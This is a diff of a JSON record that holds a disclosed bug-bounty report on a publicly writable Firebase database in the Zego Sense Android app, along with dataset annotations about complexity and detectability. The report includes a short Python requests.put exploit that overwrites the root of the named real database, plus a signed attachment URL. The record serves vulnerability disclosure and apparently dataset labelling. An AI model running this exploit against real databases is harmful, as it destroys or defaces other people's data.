@@ -1,50 +1,50 @@
 {
-    "reported_to": "Zego",
-    "reported_by": "sheikhrishad0 ",
-    "title": "Firebase Database Takeover in Zego Sense Android app",
-    "content": "\nHello Team,\nSummary:\npublicly available Firebase Database (api-project-615509201590.firebaseio.com)\nPlatform Affected: [android]\ncom.zegocover.zego\nSteps To Reproduce:\nin res/values/strings.xml\n<string name=\"firebase_database_url\">https://api-project-615509201590.firebaseio.com</string>\nPOC:\nGo to https://api-project-615509201590.firebaseio.com/.json\n<image_0>\nExploit:\nimport requests\ndata= {\"Exploit\":\"Successfull\", \"H4CKED BY\": \"Sheikh Rishad\"}\nreponse = requests.put(\"https://api-project-615509201590.firebaseio.com/.json\", json=data)\nReferences:\nThere are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:\nhttps://firebase.google.com/docs/database/security/resolve-insecurities\nRegards,\nSheikh Rishad\nImpact\nThis is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.\nSo please immediately change the rule of the database to private so that nobody can able to access it outside.\n\n",
-    "severity": [
-        7.5,
-        null
+  "reported_to": "Zego",
+  "reported_by": "sheikhrishad0 ",
+  "title": "Firebase Database Takeover in Zego Sense Android app",
+  "content": "\nHello Team,\nSummary:\npublicly available Firebase Database (api-project-615509201590.firebaseio.com)\nPlatform Affected: [android]\ncom.zegocover.zego\nSteps To Reproduce:\nin res/values/strings.xml\n<string name=\"firebase_database_url\">https://api-project-615509201590.firebaseio.com</string>\nPOC:\nGo to https://api-project-615509201590.firebaseio.com/.json\n<image_0>\nExploit:\nimport requests\ndata= {\"Exploit\":\"Successfull\", \"H4CKED BY\": \"Sheikh Rishad\"}\nreponse = requests.put(\"https://api-project-615509201590.firebaseio.com/.json\", json=data)\nReferences:\nThere are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:\nhttps://firebase.google.com/docs/database/security/resolve-insecurities\nRegards,\nSheikh Rishad\nImpact\nThis is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.\nSo please immediately change the rule of the database to private so that nobody can able to access it outside.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/82r7xui5u9i0kh68u6v7uokd9khg?response-content-disposition=attachment%3B%20filename%3D%22poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5RYF454L%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T193147Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCd7xODaAZsWtoVCr0Hzg5Hwov6AVO8ZP1SFX7XpzeEHQIhALJLFfrIXn%2BNwgBsQo6YQcgGUX%2Fvdd6oeXwXo8vgM878KrIFCBsQAxoMMDEzNjE5Mjc0ODQ5IgxANAF6XRv6sKYaxr0qjwWoruKuwZNnidKcXmWiwMAkG%2FihY1uxfm842ygoDkRCjDnyjzTHzMavyVNYiMC94s7xuLIx8Qbpl54QEp%2FWd9JVejypGcN3tcA8%2BbgMrnf9V%2F%2FBfCaw7NBVKe3JDlxGURbnOK9m9LTiF2DLxHuqlJlbUuuh%2Bnaki9BpeQw7DTAE1wdKPGij%2FHXFO2GTM2YQSuTVhGq5RMcCFvogZPPxjJqzACsbiFEsB3acqF72jGmR9hy7AjqJn%2BVu%2F8XsOHZ0X4g8gmuQRyxStK96jupNpCxy903WUCggq6Vff0iV%2BJQuk3%2FsghDaKoK4WOM%2BSCbBPCXAJ%2BkzZkl9l5iw5zCWuFI6tqwJqN%2FnFzbwh8S4ejhHVn3tYJ2pTWKKGIeSUdELqa%2F5MiVKFDnPdPTcHOAIv4E8VC7GwA%2BVQ956Yq%2BWNw7er0YraO8D%2BQiExNtmIJ3%2FGLa2r5glGEab5L395U41hLywRVGs%2BfhWVoWAYwAY7Y%2FkSIgs58ZJe0rTUhTDgTqPtxo7Da2QnMydKywRRxiQiPzjZB6r7GvJNXXXP%2Bq7aSO%2FqHGv4d87wY4uiilU35DAen5RFbb1iHPBK4kYxLAaoOY0Q1bgCgX9ElL9K%2ByXbsDVgOW%2FYDv3WIFgY30%2BfHUyRbDbXDcGMMam5jEcY2mUyuS8sCOg1HA9CLDAUjra5jcnFUk83PD1V2KqEVNwSpbzkDOsVHJA9T354jfN5MefUzTnNY11WmSHAp%2BYREVaSiuQ395v5L7C6LTKE9E%2Bu9JxjEgXKdXHoOEQskbRegUbNzJ8oBzDSamrCK%2FPUkTdhC3y8cVqTxbKVoZPdMQyWY8uYXV%2BpRvP9hLY%2Bq%2FSa94ubwlN9DU5ADwWgG5vr%2FjzVf3TMIbYi78GOrABdg5PLiDP%2F%2F7nLUmHnfL3ZYdT4xgbb43M3MUkRWMreAW17OFNtrHb2uUlva1bydC636hgv%2FjAaXdozMyM9bl%2FOUdp86remWGAxAPrkMrvHi8EPGaH3SUV6V3n46FRwz8a4J0wE1nLJ0In3AwEh24V%2BEA8ooDtsbEP%2FbNrGvyTTaprj%2BbJuXm3s2ORc8026qMwjBCeUPXORjM3XxNz9tu7JpxlZHbkYYZQsHiOq2XDxgU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=62462913a00cb2a4511a589e852a73a79a3fec71f0c88c6670595ee703f67da1"
+  },
+  "disclosed_date": 1624478640,
+  "report_url": "https://hackerone.com/reports/1065134",
+  "vuln_category": "MOBILE",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "steps": [
+    [
+      1,
+      "Inspect the Android app's resources, specifically res/values/strings.xml, to find the Firebase database URL."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Authentication - Generic"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/82r7xui5u9i0kh68u6v7uokd9khg?response-content-disposition=attachment%3B%20filename%3D%22poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5RYF454L%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T193147Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCd7xODaAZsWtoVCr0Hzg5Hwov6AVO8ZP1SFX7XpzeEHQIhALJLFfrIXn%2BNwgBsQo6YQcgGUX%2Fvdd6oeXwXo8vgM878KrIFCBsQAxoMMDEzNjE5Mjc0ODQ5IgxANAF6XRv6sKYaxr0qjwWoruKuwZNnidKcXmWiwMAkG%2FihY1uxfm842ygoDkRCjDnyjzTHzMavyVNYiMC94s7xuLIx8Qbpl54QEp%2FWd9JVejypGcN3tcA8%2BbgMrnf9V%2F%2FBfCaw7NBVKe3JDlxGURbnOK9m9LTiF2DLxHuqlJlbUuuh%2Bnaki9BpeQw7DTAE1wdKPGij%2FHXFO2GTM2YQSuTVhGq5RMcCFvogZPPxjJqzACsbiFEsB3acqF72jGmR9hy7AjqJn%2BVu%2F8XsOHZ0X4g8gmuQRyxStK96jupNpCxy903WUCggq6Vff0iV%2BJQuk3%2FsghDaKoK4WOM%2BSCbBPCXAJ%2BkzZkl9l5iw5zCWuFI6tqwJqN%2FnFzbwh8S4ejhHVn3tYJ2pTWKKGIeSUdELqa%2F5MiVKFDnPdPTcHOAIv4E8VC7GwA%2BVQ956Yq%2BWNw7er0YraO8D%2BQiExNtmIJ3%2FGLa2r5glGEab5L395U41hLywRVGs%2BfhWVoWAYwAY7Y%2FkSIgs58ZJe0rTUhTDgTqPtxo7Da2QnMydKywRRxiQiPzjZB6r7GvJNXXXP%2Bq7aSO%2FqHGv4d87wY4uiilU35DAen5RFbb1iHPBK4kYxLAaoOY0Q1bgCgX9ElL9K%2ByXbsDVgOW%2FYDv3WIFgY30%2BfHUyRbDbXDcGMMam5jEcY2mUyuS8sCOg1HA9CLDAUjra5jcnFUk83PD1V2KqEVNwSpbzkDOsVHJA9T354jfN5MefUzTnNY11WmSHAp%2BYREVaSiuQ395v5L7C6LTKE9E%2Bu9JxjEgXKdXHoOEQskbRegUbNzJ8oBzDSamrCK%2FPUkTdhC3y8cVqTxbKVoZPdMQyWY8uYXV%2BpRvP9hLY%2Bq%2FSa94ubwlN9DU5ADwWgG5vr%2FjzVf3TMIbYi78GOrABdg5PLiDP%2F%2F7nLUmHnfL3ZYdT4xgbb43M3MUkRWMreAW17OFNtrHb2uUlva1bydC636hgv%2FjAaXdozMyM9bl%2FOUdp86remWGAxAPrkMrvHi8EPGaH3SUV6V3n46FRwz8a4J0wE1nLJ0In3AwEh24V%2BEA8ooDtsbEP%2FbNrGvyTTaprj%2BbJuXm3s2ORc8026qMwjBCeUPXORjM3XxNz9tu7JpxlZHbkYYZQsHiOq2XDxgU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=62462913a00cb2a4511a589e852a73a79a3fec71f0c88c6670595ee703f67da1"
-    },
-    "disclosed_date": 1624478640,
-    "report_url": "https://hackerone.com/reports/1065134",
-    "vuln_category": "MOBILE",
-    "is_multi_component": false,
-    "complexity": "LOW",
-    "novelty": "LOW",
-    "steps": [
-        [
-            1,
-            "Inspect the Android app's resources, specifically res/values/strings.xml, to find the Firebase database URL."
-        ],
-        [
-            2,
-            "Access the Firebase database directly by visiting the URL found in the previous step, e.g., https://api-project-615509201590.firebaseio.com/.json."
-        ]
-    ],
-    "vuln_description": "The vulnerability involves a publicly accessible Firebase database due to misconfigured security rules, allowing unauthorized access and modification of the database.",
-    "reason": "The attack is straightforward and involves only a few steps: locating the Firebase URL in the app's resources and accessing it directly. There are no complex interactions or states involved, and the logic is common for Firebase misconfigurations.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": true
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": false
-    }
+    [
+      2,
+      "Access the Firebase database directly by visiting the URL found in the previous step, e.g., https://api-project-615509201590.firebaseio.com/.json."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves a publicly accessible Firebase database due to misconfigured security rules, allowing unauthorized access and modification of the database.",
+  "reason": "The attack is straightforward and involves only a few steps: locating the Firebase URL in the app's resources and accessing it directly. There are no complex interactions or states involved, and the logic is common for Firebase misconfigurations.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The Firebase Database Takeover vulnerability involves a misconfigured Firebase database that is publicly accessible. The methodology described focuses on detecting authorization and authentication vulnerabilities within the same application by swapping user sessions and resource IDs. However, the Firebase misconfiguration is not related to user sessions or resource IDs within the application but rather to the database's security rules being set to public. This type of vulnerability is not detectable by the described methodology because it does not involve the application's authorization or authentication mechanisms but rather the infrastructure's misconfiguration.",
+    "is_detectable": false
+  }
 }
